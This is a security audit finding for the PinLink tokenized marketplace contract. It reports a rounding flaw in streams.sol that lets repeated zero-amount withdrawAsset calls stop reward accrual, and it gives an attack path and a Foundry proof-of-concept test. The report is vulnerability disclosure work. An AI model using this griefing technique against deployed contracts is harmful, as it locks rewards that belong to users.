# Rounding issue of reward calculation will affect reward losing of users.

### Summary

In streams.sol
https://github.com/sherlock-audit/2025-03-pinlink-rwa-tokenized-depin-marketplace/blob/main/marketplace-contracts/src/marketplaces/streams.sol#L112

In globalRewardsPerStaked() and updateRewards() function, 
By small rounding issue, the rewards can't be accumulated.

### Root Cause

In updateReward() function,
The function calculate pendingReward and update updatedRewardsPerStaked variable.
But if updateReward() function is called often with short period, pendingReward will be added 0 and udpatedRewardsPerStaked will be updated.

Therefore the users who have small stack balance might not get reward.

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

1. When attacker will purchase small stakedBalances and withdraw it.
2. So REWARDS_PROXY_ACCOUNT will has some stakedBalances and attacker gets fractional Assets
3. The attacker repeatedly calls the withdrawAsset() function with an amount of 0 at short intervals.
4. As result REWARDS_PROXY_ACCOUNT will not get reward.
5. So expected reward of REWARDS_PROXY_ACCOUNT will be locked in contract.

### Impact

@Here are the underlying requirements that should always hold:
  rewards are never locked in the contract and should be always claimable by someone

But : 
- The users that have small stack balance might not get reward by frequent calling updateReward() 
- The REWARDS_PROXY_ACCOUNT can't get reward by attacker.

So the rewards will be locked in contract by these 2 cases. 


### PoC

In depostiRewards.t.sol 

- add import "forge-std/console.sol"; 
- add test function

```solidity
function test_attacker_not_reward() public {

        vm.startPrank(admin);

        uint256 skipAmount = 20 seconds;

        uint256 asset5 = 555;
        fractions.mint(asset5, admin, 1000);
       
        uint256 amount = 10e6;
        uint256 balanceBefore = USDC.balanceOf(address(pshop));
        
        pshop.enableAsset(address(fractions), asset5, admin);
        vm.stopPrank();

        

        vm.prank(operator);
        pshop.depositRewards(address(fractions), asset5, amount, 15 days);

        vm.prank(admin);
        bytes32 listingId = pshop.list(address(fractions), asset5, 10, 10**18, block.timestamp + 15 days);

        vm.prank(alice);
        pshop.purchase(listingId, 5, 10000 * 10**18);

        vm.prank(alice);
        pshop.withdrawAsset(address(fractions), asset5, 5, alice);
        //so reward proxy has 5 fractions.

        address proxyRewardsAccount = pshop.REWARDS_PROXY_ACCOUNT();

        skip(skipAmount * 3); 

        vm.prank(bob);
        pshop.withdrawAsset(address(fractions), asset5, 0, bob);
        console.log("-after 1 mins-");
        console.log(pshop.getPendingRewards(address(fractions), asset5,proxyRewardsAccount));

        skip(skipAmount);

        vm.prank(bob);
        pshop.withdrawAsset(address(fractions), asset5, 0, bob);
        console.log("-after 1 mins 20 secs-");
        console.log(pshop.getPendingRewards(address(fractions), asset5,proxyRewardsAccount));

        skip(skipAmount);

        vm.prank(bob);
        pshop.withdrawAsset(address(fractions), asset5, 0, bob);
        console.log("-after 1 mins 40 secs-");
        console.log(pshop.getPendingRewards(address(fractions), asset5,proxyRewardsAccount));

        skip(skipAmount);

        vm.prank(bob);
        pshop.withdrawAsset(address(fractions), asset5, 0, bob);
        console.log("-after 2 mins-");
        console.log(pshop.getPendingRewards(address(fractions), asset5,proxyRewardsAccount));

        

        
    }
```

- Run command : forge test --match-test test_attacker_not_reward -vv

- Result 
 
  -after 1 mins-
  2
  -after 1 mins 20 secs-
  2
  -after 1 mins 40 secs-
  2
  -after 2 mins-
  2


As result, REWARDS_PROXY_ACCOUNT get 2 rewards in 1 min.
But after attacker starts to attack, can't get reward in another 1 min.


### Mitigation

Need to modify to minimize rounding issue.
